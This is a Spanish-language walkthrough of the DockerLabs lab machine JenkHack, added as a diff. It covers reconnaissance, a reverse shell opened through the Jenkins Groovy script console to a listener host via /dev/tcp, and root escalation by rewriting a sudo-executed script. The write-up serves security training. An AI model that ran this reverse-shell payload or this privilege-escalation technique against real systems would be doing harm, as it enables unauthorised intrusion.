@@ -1,0 +1,234 @@
+---
+title: JenkHack
+description: Resolución completa de la máquina virtual *JenkHack* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **JenkHack**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone múltiples servicios web, incluyendo Jenkins en el puerto 8080. En el código fuente del sitio principal, se encuentran credenciales expuestas que permiten acceder al panel de administración de Jenkins. Desde allí, se utiliza la consola de scripts Groovy para obtener una reverse shell como el usuario `jenkins`.
+Una vez dentro, se encuentra un archivo `note.txt` con una contraseña codificada en Base85, que permite acceder al usuario `jenkhack`. Finalmente, se identifica un script `/opt/bash.sh` ejecutado por `root` a través de `sudo`, que es modificable por `jenkhack`, permitiendo la escalada de privilegios a `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'JenkHack',
+    Autor: 'd1se0',
+    Dificultad: 'Fácil',
+    Fecha: '05/09/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip JenkHack.zip
+sudo bash auto_deploy.sh JenkHack.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p JenkHack/{content,exploits,nmap,scripts}
+cd JenkHack
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+* **443/tcp** — HTTPS
+* **8080/tcp** — HTTP (Jenkins)
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1762583068/Ports_in6dpq.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80,443,8080 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web (puerto 80)
+
+Se realiza un escaneo de directorios:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1762582234/Gobuster_krxqn2.png)
+
+Se confirma un `index.php` activo:
+
+![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1762582234/Index_o0dyxb.png)
+
+### 1.4 Enumeración web (puertos 443 y 8080)
+
+En ambos puertos se observa un panel de autenticación perteneciente a Jenkins.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Credenciales expuestas
+
+Dentro del código fuente del `index.php` en el puerto 80, se encuentran credenciales expuestas:
+
+![Code](https://res.cloudinary.com/dewqswzke/image/upload/v1762584049/Code_yku5nz.png)
+
+### 2.2 Acceso a Jenkins
+
+Las credenciales permiten autenticarse como **admin** en el panel Jenkins del puerto 8080:
+
+![Jenkins Dashboard](https://res.cloudinary.com/dewqswzke/image/upload/v1762582234/JenkinsDashboard_od4yh5.png)
+
+### 2.3 Reverse shell mediante Groovy Script Console
+
+Con privilegios administrativos en Jenkins, se utiliza la consola de scripts Groovy desde `/script`. Se ejecuta el siguiente script:
+
+```groovy
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/172.17.0.1/443; cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+![Script](https://res.cloudinary.com/dewqswzke/image/upload/v1762584244/Scritp_xpckmm.png)
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se obtiene una reverse shell como usuario `jenkins`:
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1762584534/Reverse_gpgw3i.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De jenkins → jenkhack
+
+En el directorio `/var/www/jenkhack` se encuentra un archivo `note.txt`:
+
+![Note.txt](https://res.cloudinary.com/dewqswzke/image/upload/v1762584783/note.txt_rymfut.png)
+
+La contraseña está codificada en **Base85**. Se decodifica:
+
+![CyberChef](https://res.cloudinary.com/dewqswzke/image/upload/v1762582233/Bake_vwwwgb.png)
+
+Con la credencial decodificada, se accede al usuario `jenkhack`:
+
+```bash
+su jenkhack
+```
+
+### 3.2 De jenkhack → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1762585049/Sudo-l_bzj1bk.png)
+
+El usuario puede ejecutar `/usr/local/bin/bash` como root. Al ejecutarlo:
+
+![Fail Bash](https://res.cloudinary.com/dewqswzke/image/upload/v1762582233/FailBash_coyeie.png)
+
+Se comprueba que el binario ejecuta un script. Se revisa su contenido con `strings`, apareciendo una referencia a `/opt/bash.sh`:
+
+![Another Bash](https://res.cloudinary.com/dewqswzke/image/upload/v1762582233/AnotherBash_zdo4t8.png)
+
+El usuario tiene permisos de escritura sobre `/opt/bash.sh`. Se procede a modificar el script:
+
+```bash
+rm /opt/bash.sh
+echo -e "#!/bin/bash\n/bin/bash" > /opt/bash.sh
+chmod +x /opt/bash.sh
+```
+
+Se ejecuta el binario delegado:
+
+```bash
+sudo -u root /usr/local/bin/bash
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1762585616/Root_mrjkmg.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Credenciales expuestas en código fuente",
+      severity: "Crítica",
+      impact: "Acceso al panel de administración de Jenkins"
+    },
+    {
+      vulnerability: "Consola de scripts Groovy habilitada en Jenkins",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como jenkins"
+    },
+    {
+      vulnerability: "Contraseña codificada en Base85 en archivo accesible",
+      severity: "Media",
+      impact: "Acceso al usuario jenkhack"
+    },
+    {
+      vulnerability: "Script ejecutado por root y modificable por jenkhack",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    },
+    {
+      vulnerability: "Falta de control de integridad en binarios wrapper",
+      severity: "Alta",
+      impact: "Manipulación de scripts ejecutados con privilegios"
+    }
+  ]}
+/>
